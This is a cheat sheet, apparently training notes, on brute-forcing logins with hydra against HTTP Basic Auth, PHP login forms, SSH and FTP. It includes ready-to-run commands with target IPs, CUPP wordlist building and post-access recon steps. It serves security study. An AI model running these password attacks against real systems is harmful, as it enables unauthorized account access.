# Login Brute Forcing

1. [Basic HTTP Auth Brute Forcing](#basic-http-auth-brute-forcing)
1. [Web Forms Brute Forcing](#web-forms-brute-forcing)
1. [Service Authentication Attacks](#service-authentication-attacks)

## Basic HTTP Auth Brute Forcing

* Basic HTTP Authentication:

  * uses user ID and password
  * client sends first request without auth info; server's response contains ```WWW-Authenticate``` header field requesting for creds
  * client uses base64 encoding for id and password, sent in Authorization header field

* Types of login brute force attacks:

  * online brute force - attacking live app over network
  * offline brute force - cracking hashes
  * reverse brute force - username brute force or password spraying
  * hybrid brute force - attacking user by customized wordlist

* Default passwords:

  ```shell
  hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
  # -C for combined username and password
  # -s for target port
  # http-get is request-method
  # target path is /
  ```

* Username brute force:

  ```shell
  hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
  # -L for username wordlist
  # -P for password wordlist
  # -u to try all users on each password
  # by default it is each user with all passwords, which will take time
  # -f is to stop after first successful login

  # we can also assign static username using -l
  # and -p for static password
  ```

## Web Forms Brute Forcing

* Key ```http``` modules are ```http[s]-{head|get|post}``` and ```http[s]-post-form``` - the former is for basic HTTP authentication while the latter is for login forms like ```.php``` or ```.aspx```.

  ```shell
  # in case of php forms using POST request
  
  hydra http-post-form -U
  # lists parameters reqd for usage
  # we need URL path, username:password parameters and fail/success login string
  ```

* If we provide 'fail' string, ```hydra``` will run till string is not found in response; in case of 'success', it will run till string is found in response.

* For 'fail', we need to consider something specific, like from the source code of the login page, and feed it to ```hydra``` with other parameters:

  ```"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"```

* Ways to determine login parameters:

  * Developer Tools in browser - in-built Network Tools will show us the sent HTTP requests (Copy POST data) after we try logging in with any creds

  * Burp Suite - we can intercept our login attempt; usually the last string will include the parameters (e.g. - "username=admin&password=admin"). Full target path:

    ```"/login.php:username=^USER^&password=^PASS^:F=<form name='login'"```

* If using a default password wordlist does not work, we should attempt brute force of login form using static usernames (admin, administrator, root, adm, wpadmin, etc.) and a password wordlist:

  ```shell
  hydra -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -f 94.237.63.93 -s 38075 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
  ```

## Service Authentication Attacks

* Personalized wordlists:

  * We can use tools such as ```CUPP``` to create custom password wordlist based on victim's info using ```cupp -i``` command

  * If a password policy is in place, we can remove passwords that don't meet the required conditions:

    ```bash
    sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
    sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
    sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
    ```

  * We can use mangling techniques to create permutations and alterations of our passwords, using tools like ```The Mentalist``` or ```rsmangler```

  * We can also create a custom username wordlist based on victim info - we can use tools like ```Username Anarchy```

* SSH attack:

  ```shell
  hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
  # -t 4 is added for max parallel attempts
  # too many SSH connections can cause issues
  ```

  ```shell
  # once we have SSH access, we can do recon by checking for other users
  ls /home

  # we can check for locally open ports
  netstat -antp | grep -i list
  ```

* FTP attack:

  ```shell
  # if we have SSH access
  # and hydra is locally installed
  hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
  ```
